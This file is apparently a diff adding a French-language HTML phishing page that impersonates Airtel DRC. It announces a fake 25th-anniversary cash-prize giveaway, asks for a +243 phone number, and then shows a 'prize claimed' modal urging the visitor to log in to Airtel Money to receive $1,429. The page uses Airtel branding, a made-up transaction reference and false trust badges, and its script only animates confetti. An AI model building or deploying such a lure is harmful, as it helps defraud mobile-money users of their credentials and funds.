@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Airtel DRC - Prix Réclamé</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+  }
+
+  body {
+    min-height: 100vh;
+    background: #0a0a0a;
+    overflow-x: hidden;
+  }
+
+  .ann-root {
+    position: relative;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #1a0000 0%, #2d0000 40%, #1a0505 100%);
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  /* Blobs */
+  .ann-blob {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.5;
+    pointer-events: none;
+  }
+  .ann-blob-1 {
+    width: 400px;
+    height: 400px;
+    background: #e30613;
+    top: -100px;
+    left: -100px;
+    animation: float 8s ease-in-out infinite;
+  }
+  .ann-blob-2 {
+    width: 350px;
+    height: 350px;
+    background: #ffcc00;
+    bottom: -80px;
+    right: -80px;
+    animation: float 10s ease-in-out infinite reverse;
+    opacity: 0.3;
+  }
+  .ann-blob-3 {
+    width: 300px;
+    height: 300px;
+    background: #e30613;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    animation: float 12s ease-in-out infinite;
+    opacity: 0.2;
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(30px, -30px) scale(1.1); }
+  }
+
+  .ann-confetti-layer {
+    position: absolute;
+    inset: 0;
+    pointer-events: none;
+    overflow: hidden;
+  }
+
+  .ann-inner {
+    position: relative;
+    z-index: 10;
+    width: 100%;
+    max-width: 480px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 24px;
+  }
+
+  /* Logo bar */
+  .ann-logo-bar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: rgba(255, 255, 255, 0.05);
+    padding: 10px 20px;
+    border-radius: 50px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+  }
+
+  .ann-logo {
+    height: 32px;
+    width: auto;
+    filter: brightness(0) invert(1);
+  }
+
+  .ann-logo-divider {
+    width: 1px;
+    height: 24px;
+    background: rgba(255, 255, 255, 0.2);
+  }
+
+  .ann-25-badge {
+    color: #ffcc00;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+  }
+
+  /* Hero */
+  .ann-hero {
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .ann-anniversary-ring {
+    width: 110px;
+    height: 110px;
+    border-radius: 50%;
+    background: conic-gradient(from 0deg, #e30613, #ffcc00, #e30613, #ffcc00, #e30613);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    box-shadow: 0 0 40px rgba(227, 6, 19, 0.6);
+    animation: pulse-ring 3s ease-in-out infinite;
+  }
+
+  .ann-anniversary-ring::before {
+    content: '';
+    position: absolute;
+    inset: 5px;
+    border-radius: 50%;
+    background: #1a0000;
+  }
+
+  @keyframes pulse-ring {
+    0%, 100% { box-shadow: 0 0 40px rgba(227, 6, 19, 0.6); }
+    50% { box-shadow: 0 0 60px rgba(255, 204, 0, 0.8); }
+  }
+
+  .ann-25-num {
+    position: relative;
+    z-index: 1;
+    font-size: 40px;
+    font-weight: 900;
+    color: #ffcc00;
+    line-height: 1;
+  }
+
+  .ann-25-label {
+    position: relative;
+    z-index: 1;
+    font-size: 12px;
+    font-weight: 600;
+    color: #fff;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .ann-hero-title {
+    font-size: 28px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.3;
+    text-align: center;
+  }
+
+  .ann-gold {
+    background: linear-gradient(90deg, #ffcc00, #ffaa00, #ffcc00);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .ann-hero-sub {
+    font-size: 14px;
+    color: rgba(255, 255, 255, 0.75);
+    line-height: 1.6;
+    text-align: center;
+    max-width: 380px;
+  }
+
+  /* Card */
+  .ann-card {
+    width: 100%;
+    background: rgba(255, 255, 255, 0.06);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 20px;
+    padding: 24px;
+    backdrop-filter: blur(20px);
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+  }
+
+  .ann-card-title {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 16px;
+    font-weight: 700;
+    color: #fff;
+  }
+
+  .ann-card-title-icon {
+    font-size: 20px;
+  }
+
+  .ann-input-wrap {
+    display: flex;
+    align-items: center;
+    background: rgba(0, 0, 0, 0.4);
+    border: 2px solid rgba(255, 204, 0, 0.3);
+    border-radius: 12px;
+    padding: 0 16px;
+    transition: border-color 0.3s;
+  }
+
+  .ann-input-wrap:focus-within {
+    border-color: #ffcc00;
+    box-shadow: 0 0 20px rgba(255, 204, 0, 0.2);
+  }
+
+  .ann-prefix {
+    color: #ffcc00;
+    font-weight: 700;
+    font-size: 16px;
+    padding-right: 10px;
+    border-right: 1px solid rgba(255, 255, 255, 0.15);
+    margin-right: 10px;
+  }
+
+  .ann-input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: #fff;
+    font-size: 16px;
+    padding: 16px 0;
+    letter-spacing: 1px;
+  }
+
+  .ann-input::placeholder {
+    color: rgba(255, 255, 255, 0.35);
+    font-size: 14px;
+    letter-spacing: 0;
+  }
+
+  .ann-check-btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #e30613, #b00510);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 8px 24px rgba(227, 6, 19, 0.4);
+    letter-spacing: 0.5px;
+  }
+
+  .ann-check-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 32px rgba(227, 6, 19, 0.6);
+  }
+
+  /* Trust row */
+  .ann-trust-row {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    justify-content: center;
+  }
+
+  .ann-trust-pill {
+    background: rgba(255, 255, 255, 0.06);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 50px;
+    padding: 8px 16px;
+    font-size: 12px;
+    color: rgba(255, 255, 255, 0.8);
+    font-weight: 600;
+    white-space: nowrap;
+  }
+
+  /* ==================== MODAL ==================== */
+  .ann-modal-bg {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(8px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    z-index: 100;
+    animation: fadeIn 0.4s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  .ann-modal {
+    width: 100%;
+    max-width: 440px;
+    background: linear-gradient(135deg, #2d0000 0%, #1a0000 100%);
+    border: 1px solid rgba(255, 204, 0, 0.3);
+    border-radius: 24px;
+    overflow: hidden;
+    box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 60px rgba(227, 6, 19, 0.3);
+    animation: slideUp 0.4s ease;
+  }
+
+  @keyframes slideUp {
+    from { transform: translateY(30px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .ann-modal-header {
+    padding: 20px 24px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  }
+
+  .ann-modal-header--minimal {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 18px 24px;
+    background: rgba(255, 204, 0, 0.05);
+  }
+
+  .ann-25-badge-sm {
+    color: #ffcc00;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  /* Claimed body */
+  .ann-claimed-body {
+    padding: 32px 24px 24px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: 16px;
+  }
+
+  .ann-claimed-icon {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #00c853, #009624);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 42px;
+    color: #fff;
+    font-weight: 900;
+    box-shadow: 0 0 40px rgba(0, 200, 83, 0.6);
+    animation: pulse-success 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse-success {
+    0%, 100% { box-shadow: 0 0 40px rgba(0, 200, 83, 0.6); }
+    50% { box-shadow: 0 0 60px rgba(0, 200, 83, 0.9); }
+  }
+
+  .ann-claimed-title {
+    font-size: 26px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.2;
+  }
+
+  .ann-claimed-msg {
+    font-size: 14px;
+    color: rgba(255, 255, 255, 0.75);
+    line-height: 1.7;
+    max-width: 340px;
+  }
+
+  .ann-claimed-msg strong {
+    color: #c0001a;
+    font-weight: 800;
+  }
+
+  .ann-claimed-ref {
+    width: 100%;
+    background: rgba(0, 0, 0, 0.4);
+    border: 1px solid rgba(255, 204, 0, 0.2);
+    border-radius: 12px;
+    padding: 14px 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    text-align: left;
+    margin-top: 8px;
+  }
+
+  .ann-claimed-ref {
+    font-size: 11px;
+    color: rgba(255, 255, 255, 0.5);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-weight: 600;
+  }
+
+  .ann-claimed-ref strong {
+    font-size: 15px;
+    color: #ffcc00;
+    font-weight: 800;
+    letter-spacing: 1.5px;
+    text-transform: none;
+    font-family: 'Courier New', monospace;
+  }
+
+  .ann-claim-btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #e30613, #b00510);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s;
+    box-shadow: 0 8px 24px rgba(227, 6, 19, 0.4);
+    letter-spacing: 0.3px;
+    margin-top: 8px;
+  }
+
+  .ann-claim-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 32px rgba(227, 6, 19, 0.6);
+  }
+
+  .ann-claim-btn:active {
+    transform: translateY(0);
+  }
+
+  .ann-close-final-btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    background: transparent;
+    color: rgba(255, 255, 255, 0.5);
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: color 0.3s;
+  }
+
+  .ann-close-final-btn:hover {
+    color: rgba(255, 255, 255, 0.8);
+  }
+
+  /* Confetti */
+  .confetti-piece {
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    top: -20px;
+    opacity: 0;
+    animation: confetti-fall linear forwards;
+  }
+
+  @keyframes confetti-fall {
+    0% {
+      transform: translateY(0) rotate(0deg);
+      opacity: 1;
+    }
+    100% {
+      transform: translateY(100vh) rotate(720deg);
+      opacity: 0;
+    }
+  }
+</style>
+</head>
+<body>
+<div id="root">
+  <div class="ann-root">
+    <div class="ann-blob ann-blob-1"></div>
+    <div class="ann-blob ann-blob-2"></div>
+    <div class="ann-blob ann-blob-3"></div>
+    <div class="ann-confetti-layer" id="confettiLayer"></div>
+    <div class="ann-inner">
+      <div class="ann-logo-bar">
+        <img alt="Airtel" class="ann-logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+        <div class="ann-logo-divider"></div>
+        <span class="ann-25-badge">25 ans ensemble</span>
+      </div>
+
+      <!-- HERO -->
+      <div class="ann-hero">
+        <div class="ann-anniversary-ring">
+          <div class="ann-25-num">25</div>
+          <div class="ann-25-label">Ans</div>
+        </div>
+        <h1 class="ann-hero-title">Grande Célébration<br><span class="ann-gold">Airtel DRC 🎉</span></h1>
+        <p class="ann-hero-sub">Pour nos 25 ans, nous offrons des cash prizes exclusifs à nos abonnés fidèles. Vérifiez votre éligibilité maintenant !</p>
+      </div>
+
+      <!-- CARD -->
+      <div class="ann-card">
+        <div class="ann-card-title"><span class="ann-card-title-icon">🎁</span> Vérifier mon éligibilité</div>
+        <div class="ann-input-wrap">
+          <span class="ann-prefix">+243</span>
+          <input class="ann-input" inputmode="numeric" placeholder="912345678 ou 0912345678" maxlength="10" type="tel" value="912344567">
+        </div>
+        <button class="ann-check-btn">🔍 Vérifier mon numéro</button>
+      </div>
+
+      <!-- TRUST ROW -->
+      <div class="ann-trust-row">
+        <div class="ann-trust-pill">🔒 Sécurisé</div>
+        <div class="ann-trust-pill">⚡ Résultat instantané</div>
+        <div class="ann-trust-pill">👥 25K gagnants</div>
+      </div>
+    </div>
+
+    <!-- ==================== PRIX RÉCLAMÉ MODAL ==================== -->
+    <div class="ann-modal-bg">
+      <div class="ann-modal">
+        <div class="ann-modal-header ann-modal-header--minimal">
+          <div class="ann-25-badge-sm">Airtel 25 Ans</div>
+        </div>
+
+        <div class="ann-claimed-body">
+          <div class="ann-claimed-icon">✓</div>
+          <div class="ann-claimed-title">Prix réclamé !</div>
+          <p class="ann-claimed-msg">
+            Connectez-vous à votre compte Airtel Money pour finaliser le transfert de
+            <strong style="color: rgb(192, 0, 26);">$1,429</strong>.
+            Cela ne prend que quelques secondes.
+          </p>
+
+          <div class="ann-claimed-ref">
+            Référence de transaction
+            <strong>AIR-LDMT-6936</strong>
+          </div>
+
+          <button class="ann-claim-btn">🔐 Se connecter pour recevoir le prix</button>
+          <button class="ann-close-final-btn">Plus tard</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  /* ==================== CONFETTI ==================== */
+  const confettiLayer = document.getElementById('confettiLayer');
+  const confettiColors = ['#e30613', '#ffcc00', '#ffffff', '#00c853', '#ffaa00'];
+
+  function createConfetti() {
+    const piece = document.createElement('div');
+    piece.classList.add('confetti-piece');
+    piece.style.left = Math.random() * 100 + '%';
+    piece.style.backgroundColor = confettiColors[Math.floor(Math.random() * confettiColors.length)];
+    piece.style.width = (Math.random() * 8 + 6) + 'px';
+    piece.style.height = (Math.random() * 8 + 6) + 'px';
+    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+    piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
+    piece.style.animationDelay = Math.random() * 0.5 + 's';
+    confettiLayer.appendChild(piece);
+    setTimeout(() => piece.remove(), 5000);
+  }
+
+  setInterval(createConfetti, 300);
+  for (let i = 0; i < 30; i++) setTimeout(createConfetti, i * 80);
+
+  /* ==================== CLOSE MODAL ==================== */
+  document.querySelector('.ann-close-final-btn').addEventListener('click', () => {
+    document.querySelector('.ann-modal-bg').style.display = 'none';
+  });
+</script>
+</body>
+</html>
